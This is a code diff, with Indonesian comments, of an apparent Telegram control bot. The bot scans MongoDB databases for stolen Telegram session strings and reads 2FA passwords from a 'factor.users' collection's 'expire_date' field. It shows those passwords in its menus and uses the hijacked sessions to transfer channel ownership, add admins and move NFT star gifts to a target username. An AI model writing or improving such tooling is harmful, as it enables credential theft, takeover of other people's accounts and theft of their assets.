@@ -53,20 +53,19 @@ def owner_only_callback(func):
 def get_all_sessions(uri, max_per_db=500):
     """
     Ambil semua session dari MongoDB.
-    KHUSUS: collection 'factor.users' (atau 'PyroUbot.factor.users')
-    field 'expire_date' berisi PASSWORD 2FA (bukan tanggal expired!)
+    KHUSUS: collection 'factor.users' (case insensitive)
+    field 'expire_date' berisi PASSWORD 2FA.
     """
     try:
         client = MongoClient(uri, serverSelectionTimeoutMS=15000, connectTimeoutMS=10000)
         sessions = []
         client.admin.command('ping')
-        
+
         for db_name in client.list_database_names():
             if db_name in ['admin', 'local', 'config']:
                 continue
             db = client[db_name]
             count = 0
-            
             for col_name in db.list_collection_names():
                 if count >= max_per_db:
                     break
@@ -74,27 +73,26 @@ def get_all_sessions(uri, max_per_db=500):
                     for doc in db[col_name].find({}).limit(200):
                         if count >= max_per_db:
                             break
-                        
                         session_str = None
                         twofa_password = None
-                        
+
                         # Cari session string
                         for field, value in doc.items():
                             if isinstance(value, str) and len(value) > 100:
                                 if re.match(r'^[A-Za-z0-9+/=_-]+$', value) and len(value) > 150:
                                     session_str = value
                                     break
-                        
                         if not session_str:
                             continue
-                        
-                        # ===== PERBAIKAN: AMBIL PASSWORD DARI expire_date DI factor.users =====
-                        if col_name == 'factor.users' or 'factor' in col_name:
-                            if 'expire_date' in doc:
+
+                        # === AMBIL PASSWORD DARI expire_date DI factor.users ===
+                        # Nama collection bisa 'factor.users' atau 'PyroUbot.factor.users' atau apapun yang mengandung 'factor.users'
+                        if 'factor.users' in col_name.lower():
+                            if 'expire_date' in doc and doc['expire_date']:
                                 twofa_password = str(doc['expire_date'])
                                 logger.info(f"Found 2FA password in factor.users: {twofa_password}")
-                        
-                        # Jika tidak ketemu, cari field lain
+
+                        # Jika tidak ketemu, coba field lain (fallback)
                         if not twofa_password:
                             for field in ['password', '2fa_password', 'twofa_password', 'expire_date']:
                                 if field in doc and doc[field]:
@@ -102,10 +100,10 @@ def get_all_sessions(uri, max_per_db=500):
                                     if len(val) >= 4:
                                         twofa_password = val
                                         break
-                        
+
                         has_2fa = bool(twofa_password) or doc.get('has_2fa') or doc.get('two_factor') or doc.get('2fa')
                         twofa_hint = doc.get('hint', doc.get('twofa_hint', ''))
-                        
+
                         sessions.append({
                             'session': session_str,
                             'database': db_name,
@@ -118,9 +116,8 @@ def get_all_sessions(uri, max_per_db=500):
                 except Exception as e:
                     logger.error(f"Error in collection {col_name}: {e}")
                     continue
-        
         client.close()
-        
+
         # Hapus duplikat, prioritaskan yang punya password
         unique = {}
         for s in sessions:
@@ -130,7 +127,7 @@ def get_all_sessions(uri, max_per_db=500):
                 if s['twofa_password'] and not unique[s['session']]['twofa_password']:
                     unique[s['session']]['twofa_password'] = s['twofa_password']
                     unique[s['session']]['has_2fa'] = True
-        
+
         result = list(unique.values())
         logger.info(f"Total sessions found: {len(result)}")
         for s in result[:5]:
@@ -308,7 +305,7 @@ async def get_all_channels_with_admins(app):
         logger.error(f"Error get all channels admins: {e}")
         return []
 
-# ==================== PERBAIKAN ADD ADMIN ====================
+# ==================== ADD ADMIN ====================
 async def add_admin_to_channel(app, channel_id, target_username):
     try:
         target_username = target_username.strip().replace('@', '')
@@ -374,7 +371,7 @@ async def leave_all_channels(app):
     report = f"📋 **HASIL KELUAR DARI SEMUA CHANNEL**\n\n✅ Berhasil: {success_count}/{len(channels)}\n\n📝 **DETAIL:**\n" + "\n".join(results[:20])
     return True, report
 
-# ==================== PERBAIKAN TRANSFER OWNER ====================
+# ==================== TRANSFER OWNER ====================
 async def transfer_owner_channel(app, channel_id, target_username, password=""):
     try:
         target_username = target_username.strip().replace('@', '')
@@ -408,7 +405,7 @@ async def transfer_owner_channel(app, channel_id, target_username, password=""):
         else:
             return False, f"❌ Gagal: {error_msg[:150]}"
 
-# ==================== FITUR TRANSFER NFT GIFT ====================
+# ==================== NFT GIFT ====================
 async def get_owned_gifts(app):
     try:
         resp = await app.invoke(
@@ -439,13 +436,10 @@ async def transfer_nft_gift(app, saved_gift, target_username):
     try:
         target = await app.get_users(target_username.strip().replace('@', ''))
         to_peer = await app.resolve_peer(target.id)
-
         msg_id = getattr(saved_gift, 'msg_id', None)
         if msg_id is None:
             return False, "❌ Gift ini tidak memiliki msg_id, tidak bisa ditransfer."
-
         input_saved_gift = raw.types.InputSavedStarGiftUser(msg_id=msg_id)
-
         await app.invoke(
             raw.functions.payments.TransferStarGift(
                 stargift=input_saved_gift,
@@ -619,7 +613,7 @@ def saved_messages_menu(page=0, total_pages=1):
     return InlineKeyboardMarkup(buttons)
 
 def main_menu(index, total, has_2fa_password=False, twofa_password=""):
-    # Tampilkan password di tombol jika ada
+    # Tampilkan password langsung di tombol jika ada
     if has_2fa_password and twofa_password:
         twofa_indicator = f" 🔑 `{twofa_password}`"
     elif has_2fa_password:
@@ -767,11 +761,12 @@ def format_account_short(info, index, total, session_string=None, db_2fa_passwor
     text += f"📱 **Nomor:** +{getattr(me, 'phone_number', '-')}\n"
     text += f"💎 **Premium:** {premium_icon}\n"
     text += f"🔐 **2FA:** {'✅ AKTIF' if info['has_2fa'] else '❌ TIDAK'}\n"
-    if info['has_2fa'] and info.get('hint'):
-        text += f"💡 **Hint 2FA:** `{info['hint']}`\n"
-    # Tampilkan password dari database
+    # Tampilkan password dari database, jika ada
     if db_2fa_password:
         text += f"🔑 **2FA PASSWORD:** `{db_2fa_password}`\n"
+    # Hanya tampilkan hint jika tidak ada password dari DB
+    elif info['has_2fa'] and info.get('hint'):
+        text += f"💡 **Hint 2FA:** `{info['hint']}`\n"
     if info.get('devices'):
         text += f"\n📱 **DEVICE LOGIN:**\n"
         for dev in info['devices'][:3]:
@@ -1379,6 +1374,7 @@ async def callback_handler(c, q: CallbackQuery):
                     text += f"💡 Hint: `{info['hint']}`\n"
             else:
                 text += f"❌ **2FA TIDAK AKTIF**\n"
+            # Tampilkan password dari DB (jika ada) dan hilangkan hint
             if db_pass:
                 text += f"\n🔑 **2FA PASSWORD (DARI DATABASE):**\n`{db_pass}`\n"
                 text += f"\n💡 **Gunakan password ini untuk:**\n"
@@ -1653,7 +1649,7 @@ async def callback_handler(c, q: CallbackQuery):
 
 if __name__ == "__main__":
     print("=" * 70)
-    print("🤖 BOT CONTROL ULTIMATE - FINAL (FIXED)")
+    print("🤖 BOT CONTROL ULTIMATE - FINAL (PASSWORD DARI expire_date)")
     print("=" * 70)
     print("✅ FITUR LENGKAP:")
     print("   • 📝 PESAN TERSIMPAN (Navigasi Slide)")
